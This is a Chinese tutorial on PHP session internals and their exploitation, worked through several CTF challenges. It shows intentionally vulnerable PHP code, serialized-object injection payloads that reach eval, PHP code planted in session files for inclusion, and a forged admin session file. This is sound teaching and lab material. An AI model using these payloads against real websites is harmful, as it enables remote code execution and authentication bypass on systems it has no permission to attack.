> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xdafXGq30N9CqpriQSI_bg)

**本文首发于先知社区，点击原文链接可查看原文**

0x1PHP session 简介
=================

0x1.1 基本概念
----------

        session 概念: 一般称为会话控制。`session` 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 `Web` 页之间跳转时，存储在 `session` 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 `Web` 页时，如果该用户还没有会话，则 `Web` 服务器将自动创建一个 `session` 对象。当会话过期或被放弃后，服务器将终止该会话。

        PHP session 概念: `PHP session` 是一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。`session` 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。它为每个访问者创建一个唯一的 `id (UID)`，并基于这个 `UID` 来存储变量。`UID` 存储在 `cookie` 中，亦或通过 `URL` 进行传导。

0x1.2 会话流程
----------

        当开始一个会话时，`PHP` 会尝试从请求中查找会话 `ID` （通常通过会话 `cookie`）， 如果请求中不包含会话 `ID` 信息，`PHP` 就会创建一个新的会话。会话开始之后，`PHP` 就会将会话中的数据设置到 `$_SESSION` 变量中。当 `PHP` 停止的时候，它会自动读取 `$_SESSION` 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。

        默认情况下，`PHP` 使用内置的文件会话保存管理器（`files`）来完成会话的保存。也可以通过配置项 `session.save_handler` 来修改所要采用的会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项 `session.save_path` 所指定的位置。

        可以通过调用函数 `session_start()` 来手动开始一个会话。如果配置项 `session.auto_start` 设置为 1， 那么请求开始的时候，会话会自动开始。`PHP 脚本`本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数 `session_write_close()` 来手动关闭会话。

0x1.3 常见配置
----------

        在 `PHP` 的安装目录下面找到 `php.ini` 文件，这个文件主要的作用是对 `PHP` 进行一些配置

```
session.save_handler = files #session的存储方式
session.save_path = "/var/lib/php/session" #session id存放路径
session.use_cookies= 1 #使用cookies在客户端保存会话
session.use_only_cookies = 1 #去保护URL中传送session id的用户
session.name = PHPSESSID #session名称（默认PHPSESSID）
session.auto_start = 0 #不启用请求自动初始化session
session.use_trans_sid = 0  #如果客户端禁用了cookie，可以通过设置session.use_trans_sid来使标识的交互方式从cookie变为url传递
session.cookie_lifetime = 0 #cookie存活时间（0为直至浏览器重启，单位秒）
session.cookie_path = / #cookie的有效路径
session.cookie_domain = #cookie的有效域名
session.cookie_httponly = #httponly标记增加到cookie上(脚本语言无法抓取)
session.serialize_handler = php #PHP标准序列化
session.gc_maxlifetime =1440 #过期时间(默认24分钟，单位秒)
```

0x1.4 存储引擎
----------

         PHP 的 `session` 中的内容默认是以文件的方式来存储的，存储方式就是由配置项`session.save_handler` 来进行确定的，默认是以文件的方式存储。  
存储的文件是以 `sess_PHPSESSID` 来进行命名的，文件的内容就是 `session` 值的序列化之后的内容。

       `session.serialize_handler` 化引擎的，除了默认用来设置 `session` 的序列化引擎的，除了默认的 `PHP` 引擎之外，还存在其他引擎，不同的引擎所对应的 `session` 的存储方式不相同。

      session.serialize_handler 有如下三种取值

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfpz28xTrrC2RV7cW9x0d3BeogD6hPWFMkVpBlhQ56h43JoD74HUyOSA/640?wx_fmt=jpeg)

        在 `PHP` 中默认使用的是 `PHP` 引擎，如果要修改为其他的引擎，只需要添加代码`ini_set('session.serialize_handler', '需要设置的引擎')`, 示例代码如下：

```
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
// do something
```

        以如下代码为例，查看不同存储引擎存储的结果

```
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_binary');//这里换不同的存储引擎
session_start();
$_SESSION['username'] = $_GET['username'];
?>
```

php_binary

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxf023PS0tibck24yw7YEFyTDkE4meAaBwFyX9ZL0DrcsLJbFNt6iahGf4w/640?wx_fmt=png)

php

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfmDy7px2uk2ZDGtzqsmg46Xy1JkRJJ82DibnX2t5sV4HooPqBZKu2Nkg/640?wx_fmt=png)

php_serialize  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfiasUPrq5HnYUAB0jjy4sHxS0Svctfqhgmg3QlYFBcI9LK8zJ40Ir0Bw/640?wx_fmt=png)

0x2PHP session 利用
=================

0x2.1 反序列化
----------

        当网站序列化存储 `session` 与反序列化读取 `session` 的方式不同时，就可能导致 `session` 反序列化漏洞的产生。一般都是以 `php_serialize` 序列化存储 `session`， 以 `PHP` 反序列化读取 `session`，造成反序列化攻击。

### 0x2.1.1 有`$_SESSION`赋值

    例子  
s1.php

```
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION["username"]=$_GET["u"];
?>
```

s2.php

```
<?php
session_start();
class session {
    var $var; 
    function __destruct() {
         eval($this->var);
    }
}
?>
```

        s1.php 使用的是 `php_serialize` 存储引擎，s2.php 使用的是 `php` 存储引擎 (页面中没有设置存储引擎，默认使用的是 `php.ini` 中 `session.serialize_handler` 设置的值，默认为 `php`)

       我们可以往 s1.php 传入如下的参数

```
s1.php?u=|O:7:"session":1:{s:3:"var";s:10:"phpinfo();";}
```

        此时使用的是 `php_seriallize` 存储引擎来序列化，存储的内容为

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfYut5JnBrniaxnCiceTicrmOazia7jefnOjouibD8baibiavske7DlNQIy5nRA/640?wx_fmt=png)

        接着访问 s2.php, 使用的是 `php` 存储引擎来反序列化，结果  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfE0hUn29WaV9uqDnEbFZeG6WAvZzvnUU45o2XEyGxP6Bmiaj84eYpQfA/640?wx_fmt=png)

        这是因为当使用 `php` 引擎的时候，`php` 引擎会以 | 作为作为 `key` 和 `value` 的分隔符，那么就会将`a:1:{s:8:"username";s:47:"`作为 `session` 的 `key`，将`O:7:"session":1:{s:3:"var";s:10:"phpinfo();";}";}`作为 `value`，然后进行反序列化。

        访问 s2.php 为什么会反序列化？这里可以可以看看官方文档

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfCNuLe1eWswq9jpNmRLXDwe4ibtbbdGElEo4lPEic2gGl34YCicRtZRX0g/640?wx_fmt=png)

        那串 `value` 不符合 "正常" 的被反序列化的字符串规则不会报错吗？这里提到一个`unserialize` 的特性，在执行 `unserialize` 的时候，如果字符串前面满足了可被反序列化的规则即后续的不规则字符会被忽略。  

### 0x2.1.2 无`$_SESSION`赋值

        上面的例子直接可以给 `$_SESSION` 赋值, 那当代码中不存在给 `$_SESSION` 赋值的时候，又该如何处理？  
查看官方文档，可知还存在 PHP 还存在一个 `upload_process` 机制，可以在`$_SESSION`中创建一个键值对，其中的值可以控制。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfialqRUHC629tIiaSogpHyxtcpXZ7VycveNI9LMibIMjAOiaXUNqQqxwmvA/640?wx_fmt=png)

        以 Jarvis OJ 平台的 PHPINFO 题目为例  
 环境地址：http://web.jarvisoj.com:32784/

index.php

```
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

        存在 phpinfo.php 文件, 由此可知 `session.upload_progress.enabled` 为 On，`session.serialize_handler` 为 `php_serialize`，与 index.php 页面所用的 PHP 存储引擎不同，存在反序列化攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfSUjHzHAT3ca4NHvnA9AuVRYymZzJicHk35AbfEusr2icic9dzgbQ7X0WQ/640?wx_fmt=png)

       `session.upload_progress.name` 为 `PHP_SESSION_UPLOAD_PROGRESS`，可以本地创建 form.html，一个向 index.php 提交 POST 请求的表单文件，其中包括`PHP_SESSION_UPLOAD_PROGRESS` 变量。  

form.html

```
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden"  />
    <input type="file"  />
    <input type="submit" />
</form>
```

       使用 bp 抓包, 在 `PHP_SESSION_UPLOAD_PROGRESS` 的 `value` 值 123 后面添加 | 和序列化的字符串

查看根目录文件

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxf4Q2teEKdHwz08eRokUd3VrM4Cz8AI7JJ3rrLAPG7O81zPaB5QvFZaw/640?wx_fmt=png)

查看根目录路径  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxftb13XYMTFpttW7jXqIekja6pLPibQvveEFg66UX1icbMCiap1zP4BFoiaw/640?wx_fmt=png)

读取 flag

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfibf6o0qaEic6GuWdle3rrmLfSgSHRPCtZwmjowhBQq6dz8RwoVgo71UA/640?wx_fmt=png)

0x2.2 文件包含
----------

        利用条件：存在文件包含，`session` 文件的路径已知，且文件中的内容可控。  
`session` 文件的路径可从 `phpinfo` 中得知

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfrbafr7CufwTJHbe4mbHEoic2S276zTcQiaGt0Qg3DZ2aasIeibaE23FCQ/640?wx_fmt=png)

或者进行猜测  

```
/var/lib/php/sessions/sess_PHPSESSIONID
/var/lib/php[\d]/sessions/sess_PHPSESSIONID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

        例子 1：  
session.php  

```
<?php
 session_start();
 $_SESSION["username"]=$_GET['s'];
?>
```

include.php

```
<?php
include $_GET['i'];
?>
```

往 session.php 传入一句话，写入 `session` 文件中

```
session.php?s=<?php phpinfo(); ?>
```

  
        在 `cookie` 中 `PHPSESSID` 值为 `k82hb2gbrj7daoncpogvlbrbcp`，即 `session` 存储的文件名为 `sess_k82hb2gbrj7daoncpogvlbrbcp`, 路径可以猜测一下，这里为 `/var/lib/php/sessions/`  

`![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfC156jA5vvpxaX8xQJsGNBkiaKHxfmjlMNU4M9wD4vhTskMFXAJriciarg/640?wx_fmt=png)`

include.php 文件包含 `session` 存储文件

```
/include.php?i=/var/lib/php/sessions/sess_k82hb2gbrj7daoncpogvlbrbcp
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfTbicLlQmaR2tNEIMkF57e1fRLjgtfbH5D2Ww2ZT0Mo4qPDkCSibByJUw/640?wx_fmt=png)

  
    例子 2：  
XCTF2018-Final_bestphp  
这里就取其中的小部分代码  
bestphp.php

```
<?php
highlight_file(__FILE__);
error_reporting(0);
ini_set('open_basedir', '/var/www/html:/tmp');


$func=isset($_GET['function'])?$_GET['function']:'filters';
call_user_func($func,$_GET);

if(isset($_GET['file'])){
 	include $_GET['file'];
}

session_start();
$_SESSION['name']=$_POST['name'];
?>
```

        这里设置了 `open_basedir`，限制了我们读取文件的范围, 这里 `session` 文件是保存在 `/var/lib/php/session/` 下，不在读取的范围里，这里可以考虑修改一下 `session` 文件存储的位置。

       session_start() 函数从  `PHP7` 开始增加了 `options` 参数，会覆盖 php.ini 中的配置。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfJOPdR9fiajWq5uQ9BAjFkgiaA2JRXSkxBcDOFusvsMFlHUNq6KXfgdjA/640?wx_fmt=png)

        利用 `session_start` 覆盖 php.ini 文件中的默认配置 `session.save_path` 的值，并写入

```
http://192.168.1.101/bestphp.php/?function=session_start&save_path=/var/www/html 
post: name=<?=phpinfo();?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfgwWJ7KaXksNeEPcWQr1QicmJbUmDQ0AKZgdgMjOzQwa35YdFvgicwRUg/640?wx_fmt=png)

成功包含 session 文件  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfJdZKgXHjBgHaLOdyj2246ia9A3aT4gILQD32fmMr4Mcr872rnpg2L3Q/640?wx_fmt=png)

        其实这个操作也可以由 `session_save_path()` 函数来完成，但是这个函数传入的参数是个字符串，不适用于此题。

0x2.3 用户伪造
----------

        利用条件：知道所使用的 `PHP session` 存储引擎，以及 `session` 文件内容可控。

        这里就以 2020 虎符杯 - babyupload 为例  
index.php

```
<?php
error_reporting(0);
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest';
}
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr');
$dir_path = "/var/babyctf/".$attr;
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(../|..\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e->getMessage();
    }
} elseif ($direction === "download") {
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(../|..\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; file');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e->getMessage();
    }
    exit;
}
?>
```

        这是一个存在上传和下载文件的功能的文件，只有当`$_SESSION['username'] ==='admin'` 才能获取 `flag`。我们可以通过下载查看 `session` 文件所使用的存储引擎，然后通过相同的存储引擎伪造为 `admin`，上传 `session` 文件 ，获取 `flag`。

        首先下载 `session` 文件，文件名为 `sess_PHPSESSID`

```
http://192.168.100.16/index.php 

post:direction=download&filename=sess_qq7ucpov7ulvt1qsji3pueea2i
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfTezjhzEt2r5k5iavhw1ApFibkcQwAIicObz9mekzkrxcBm4iaNZAkb7bTw/640?wx_fmt=png)

可知使用的是 `php_binary` , 内容为：

```
<0x08>usernames:5:"guest";
```

猜测我们只要上传一个 `session` 文件内容为：

```
<0x08>usernames:5:"admin";
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfFhed5UuDxSJ05jKTq4X9C482eH3pNzlqG1libFFfEvaNz5LfDiawfRpw/640?wx_fmt=png)

        发现如果不上传 `attr` 参数，`dir_path`会直接拼接上传的文件名 +`"_".hash_file("sha256",$_FILES['up_file']['tmp_name']);`，如果把上传文件名设置为 `sess`，并且不传递 `attr` 参数，就可以得到`/var/babyctf/sess_XXXXXXXXX`，这就可以当成 `session` 文件。

`hash_file()`是根据文件内容得到的 `hash` 值

本地创建一个文件名为 sess:

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfsCsu1zE3qj9HSsnK9scRqdFU0aHN22cco1HO3VsTr6lIo3KaZmZRuA/640?wx_fmt=png)

上传 sess 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfqXDJzFoqEQdZic0RAeahmyA83oXpnXgGkZgmejgGDl4EGFSDYCLeNhQ/640?wx_fmt=png)

计算 hash 值

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfPtRm3fPiabJLU67QlczqVLgGiayfDEENxjqqFJSamEIbUhmfaYRMqBPg/640?wx_fmt=png)

文件名为 `sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`, 尝试下载访问，如下可知已经上传成功。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxf73FvcmTVIjH4fFncDpT53lqMcKicziaJvEdIMrVczzq2PnJGSkY4Ov4w/640?wx_fmt=png)

现在就差 success.txt， 可以把 `attr` 参数设置为 success.txt，将 success.txt 变成一个目录, 从而绕过了限制。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT0sWuXTXqbzc9VyqXCzFxfbGQts9jCgm80O41WFZtXId5taXluicrWKs6qEmNCL7s4aytlSXFyg1w/640?wx_fmt=png)

  
然后把 `PHPSESSID` 修改为`432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`, 就可以得到 `flag`